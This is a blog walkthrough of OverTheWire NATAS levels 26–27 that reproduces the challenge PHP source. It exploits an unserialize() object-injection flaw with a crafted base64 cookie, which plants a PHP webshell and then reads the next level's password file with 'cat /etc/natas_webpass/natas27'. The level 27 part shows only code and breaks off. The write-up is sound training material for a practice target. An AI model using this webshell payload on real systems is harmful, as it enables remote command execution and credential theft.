<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="OverTheWire: NATAS 26 – 27" /><meta property="og:locale" content="en" /><meta name="description" content="LEVEL 26" /><meta property="og:description" content="LEVEL 26" /><link rel="canonical" href="https://megawattsec.com/posts/overthewire-natas-26/" /><meta property="og:url" content="https://megawattsec.com/posts/overthewire-natas-26/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-19T14:40:12-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="OverTheWire: NATAS 26 – 27" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-09-19T14:40:12-04:00","datePublished":"2019-09-19T14:40:12-04:00","description":"LEVEL 26","headline":"OverTheWire: NATAS 26 – 27","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/overthewire-natas-26/"},"url":"https://megawattsec.com/posts/overthewire-natas-26/"}</script><title>OverTheWire: NATAS 26 &#8211; 27 | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>OverTheWire: NATAS 26 &#8211; 27</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>OverTheWire: NATAS 26 &#8211; 27</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1568918412" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2019-09-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1360 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h3 id="level-26"><span class="mr-2">LEVEL 26</span><a href="#level-26" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-294" data-src="/assets/img/2019/09/2019-09-19_13h59_59.png" data-proofer-ignore></p><p>The sourcecode:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
  <span class="c1">// sry, this is ugly as hell.</span>
  <span class="c1">// cheers kaliman ;)</span>
  <span class="c1">// - morla</span>
  
  <span class="kd">class</span> <span class="nc">Logger</span><span class="p">{</span>
    <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
   
    <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
      <span class="c1">// initialise variables</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">initMsg</span><span class="o">=</span><span class="s2">"#--session started--#</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">exitMsg</span><span class="o">=</span><span class="s2">"#--session end--#</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
      <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span> <span class="o">=</span> <span class="s2">"/tmp/natas26_"</span> <span class="mf">.</span> <span class="nv">$file</span> <span class="mf">.</span> <span class="s2">".log"</span><span class="p">;</span>
   
      <span class="c1">// write initial message</span>
      <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="p">,</span><span class="s2">"a+"</span><span class="p">);</span>
      <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$initMsg</span><span class="p">);</span>
      <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
    <span class="p">}</span>            
   
    <span class="k">function</span> <span class="n">log</span><span class="p">(</span><span class="nv">$msg</span><span class="p">){</span>
      <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="p">,</span><span class="s2">"a+"</span><span class="p">);</span>
      <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$msg</span><span class="mf">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
      <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
    <span class="p">}</span>            
   
    <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
      <span class="c1">// write exit message</span>
      <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">logFile</span><span class="p">,</span><span class="s2">"a+"</span><span class="p">);</span>
      <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">exitMsg</span><span class="p">);</span>
      <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
    <span class="p">}</span>            
  <span class="p">}</span>
 
  <span class="k">function</span> <span class="n">showImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span>
      <span class="k">echo</span> <span class="s2">"&lt;img src=</span><span class="se">\"</span><span class="nv">$filename</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">function</span> <span class="n">drawImage</span><span class="p">(</span><span class="nv">$filename</span><span class="p">){</span>
    <span class="nv">$img</span><span class="o">=</span><span class="nb">imagecreatetruecolor</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span><span class="mi">300</span><span class="p">);</span>
    <span class="nf">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
    <span class="nb">imagepng</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>   
    <span class="nb">imagedestroy</span><span class="p">(</span><span class="nv">$img</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="k">function</span> <span class="n">drawFromUserdata</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x1"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y1"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
      <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x2"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y2"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
    
      <span class="nv">$color</span><span class="o">=</span><span class="nb">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
      <span class="nb">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"x1"</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"y1"</span><span class="p">],</span> 
              <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"x2"</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"y2"</span><span class="p">],</span> <span class="nv">$color</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"drawing"</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
      <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"drawing"</span><span class="p">]));</span>
      <span class="k">if</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$drawing</span> <span class="k">as</span> <span class="nv">$object</span><span class="p">)</span>
          <span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x1"</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y1"</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x2"</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y2"</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)){</span>
          
            <span class="nv">$color</span><span class="o">=</span><span class="nb">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
            <span class="nb">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">"x1"</span><span class="p">],</span><span class="nv">$object</span><span class="p">[</span><span class="s2">"y1"</span><span class="p">],</span>
                <span class="nv">$object</span><span class="p">[</span><span class="s2">"x2"</span><span class="p">]</span> <span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">"y2"</span><span class="p">]</span> <span class="p">,</span><span class="nv">$color</span><span class="p">);</span>
      
          <span class="p">}</span>
    <span class="p">}</span>  
  <span class="p">}</span>
  
  <span class="k">function</span> <span class="n">storeData</span><span class="p">(){</span>
    <span class="nv">$new_object</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x1"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y1"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
      <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x2"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y2"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
      <span class="nv">$new_object</span><span class="p">[</span><span class="s2">"x1"</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"x1"</span><span class="p">];</span>
      <span class="nv">$new_object</span><span class="p">[</span><span class="s2">"y1"</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"y1"</span><span class="p">];</span>
      <span class="nv">$new_object</span><span class="p">[</span><span class="s2">"x2"</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"x2"</span><span class="p">];</span>
      <span class="nv">$new_object</span><span class="p">[</span><span class="s2">"y2"</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"y2"</span><span class="p">];</span>
    <span class="p">}</span>
    
    <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"drawing"</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
      <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"drawing"</span><span class="p">]));</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
      <span class="c1">// create new array</span>
      <span class="nv">$drawing</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
    
    <span class="nv">$drawing</span><span class="p">[]</span><span class="o">=</span><span class="nv">$new_object</span><span class="p">;</span>
    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"drawing"</span><span class="p">,</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)));</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;h1&gt;</span>natas26<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>

Draw a line:<span class="nt">&lt;br&gt;</span>
<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">"input"</span> <span class="na">method=</span><span class="s">"get"</span><span class="nt">&gt;</span>
X1<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"x1"</span> <span class="na">size=</span><span class="s">2</span><span class="nt">&gt;</span>
Y1<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"y1"</span> <span class="na">size=</span><span class="s">2</span><span class="nt">&gt;</span>
X2<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"x2"</span> <span class="na">size=</span><span class="s">2</span><span class="nt">&gt;</span>
Y2<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"y2"</span> <span class="na">size=</span><span class="s">2</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"DRAW!"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span> 

<span class="cp">&lt;?php</span>
  <span class="nb">session_start</span><span class="p">();</span>

  <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"drawing"</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">||</span>
    <span class="p">(</span>  <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x1"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y1"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
      <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"x2"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"y2"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))){</span> 
    <span class="nv">$imgfile</span><span class="o">=</span><span class="s2">"img/natas26_"</span> <span class="mf">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="mf">.</span><span class="s2">".png"</span><span class="p">;</span> 
    <span class="nf">drawImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span> 
    <span class="nf">showImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
    <span class="nf">storeData</span><span class="p">();</span>
  <span class="p">}</span>
  
<span class="cp">?&gt;</span></code></pre></figure><p>Whew! So much code… the levels are getting real good now!</p><p>From reviewing the code, it looks like the vulnerability is PHP OBJECT INJECTION via the unserialize() call. According to <a href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP</a> on the nature of this vulnerability, we should be able to use the unserialize() call to overwrite ‘Logger =&gt; exitMsg’. When the page calls Logger.__destruct() method, our modified exitMsg will be saved into the log file. We should then be able to open the log file and get a stored XSS to read out the password.</p><p>We need to know the <a href="https://stackoverflow.com/questions/14297926/structure-of-a-serialized-php-string">structure</a> of serialized data pretty well to make our own. Once base64 decoded, an example of serialized data from this page is:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="n">a</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span>
  <span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="p">{</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"x1"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">"1"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"y1"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">"2"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"x2"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">"3"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"y2"</span><span class="p">;</span>
    <span class="n">s</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">"4"</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span></code></pre></figure><p>Since we actually can control the ‘$logFile’ variable as well as ‘$exitMsg’, we can change the log file into a php file, and make a webshell for executing commands!</p><p>An example of serialized data for a request that manipulates both variables:</p><figure class="highlight"><pre><code class="language-php" data-lang="php">a:1:{
  i:0;
  O:6:"Logger":2:{
    s:15:"\0Logger\0logFile";
    s:31:"img/natas26_ponderngnatas26.php";
    s:15:"\0Logger\0exitMsg";
    s:21:"<span class="nt">&lt;pre&gt;</span> <span class="cp">&lt;?=</span><span class="sb">`$_GET[1]`</span><span class="cp">?&gt;</span>";
  }
}</code></pre></figure><p>Here the structure I need to explain is the “O”, which means the Object type.</p><blockquote><p>Objects are serialized as:</p><p><code class="language-plaintext highlighter-rouge">O:&lt;i&gt;:"&lt;s&gt;":&lt;i&gt;:{&lt;properties&gt;}</code></p><p>where the first <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code> is an integer representing the string length of <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code>, and <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the fully qualified class name (class name prepended with full namespace). The second <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code> is an integer representing the number of object properties. <code class="language-plaintext highlighter-rouge">&lt;properties&gt;</code> are zero or more serialized name value pairs:</p><p><span class="lang:php decode:true crayon-inline "><name><value>&lt;/span&gt;</value></name></span></p><p>where <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is a serialized string representing the property name, and <code class="language-plaintext highlighter-rouge">&lt;value&gt;</code> any value that is serializable.</p></blockquote><p>Our first pair is</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="n">s</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="s2">"</span><span class="se">\0</span><span class="s2">Logger</span><span class="se">\0</span><span class="s2">logFile"</span><span class="p">;</span>
<span class="n">s</span><span class="o">:</span><span class="mi">31</span><span class="o">:</span><span class="s2">"img/natas26_randomname.php"</span><span class="p">;</span></code></pre></figure><p>and second pair is</p><figure class="highlight"><pre><code class="language-php" data-lang="php">s:15:"\0Logger\0exitMsg";
s:21:"<span class="nt">&lt;pre&gt;</span> <span class="cp">&lt;?=</span><span class="sb">`$_GET[1]`</span><span class="cp">?&gt;</span>";</code></pre></figure><p>That will create a php at “/img/natas26_randomname.php” with a small webshell that reads our commands from the GET request as “/?1={cmd}”.</p><p>Taking out the tabs and doing a base64 encoding will result in “YToxOntpOjA7Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNjoiaW1nL25hdGFzMjZfcmFuZG9tbmFtZS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czoyMToiPHByZT4gPD89YCRfR0VUWzFdYD8%2bIjt9fQ==”</p><p>It should be noted that the variable names in our serialized data have null bytes included because they are private variables, and that’s how they have to be represented. Per <a href="https://stackoverflow.com/questions/14297926/structure-of-a-serialized-php-string">stackoverflow</a>:</p><blockquote><p><code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is represented as</p><p><code class="language-plaintext highlighter-rouge">s:&lt;i&gt;:"&lt;s&gt;";</code></p><p>where <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code> is an integer representing the string length of <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code>. But the values of <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> differs per visibility of properties:</p><p>a. With <strong>public</strong> properties <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the simple name of the property.</p><p>b. With <strong>protected</strong> properties, however, <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the simple name of the property, prepended with <code class="language-plaintext highlighter-rouge">\0*\0</code> — an asterix, enclosed in two <code class="language-plaintext highlighter-rouge">NUL</code> characters (i.e. <code class="language-plaintext highlighter-rouge">chr(0)</code>).</p><p>c. And with <strong>private</strong> properties, <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the simple name of the property, prepended with <code class="language-plaintext highlighter-rouge">\0&lt;s&gt;\0</code> — <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code>, enclosed in two <code class="language-plaintext highlighter-rouge">NUL</code> characters, where <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the fully qualified class name.</p></blockquote><p>There’s a couple of ways to get the NUL values encoded correctly. You could use a hex editor like “010 Editor” if you’re on Windows.<br /> Or if you’re on linux, use <code class="language-plaintext highlighter-rouge">echo -n -e ‘a:1:{i:0;O:6:”Logger”:2:s:15:”\0Logger\0logFile”;s:26:”img/natas26_randomname.php”;s:15:”\0Logger\0exitMsg”;s:21:”&lt;pre&gt; ”;}}’ | base64</code></p><p>That’s it! Try it with the command <code class="language-plaintext highlighter-rouge">/?1=cat+/etc/natas_webpass/natas27</code>.</p><p> </p><h3 id="level-27"><span class="mr-2">LEVEL 27</span><a href="#level-27" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-301" data-src="/assets/img/2019/09/2019-09-20_08h50_15.png" data-proofer-ignore></p><p>The sourcecode:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>

<span class="c1">// morla / 10111</span>
<span class="c1">// database gets cleared every 5 min </span>


<span class="cm">/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/</span>


<span class="k">function</span> <span class="n">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">,</span><span class="nv">$pass</span><span class="p">){</span>
 
  <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
  <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
  
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT username from users where username='</span><span class="nv">$user</span><span class="s2">' and password='</span><span class="nv">$password</span><span class="s2">' "</span><span class="p">;</span>
  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
    <span class="k">return</span> <span class="kc">True</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">function</span> <span class="n">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
  
  <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
  
  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * from users where username='</span><span class="nv">$user</span><span class="s2">'"</span><span class="p">;</span>
  <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">return</span> <span class="kc">True</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">function</span> <span class="n">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
  
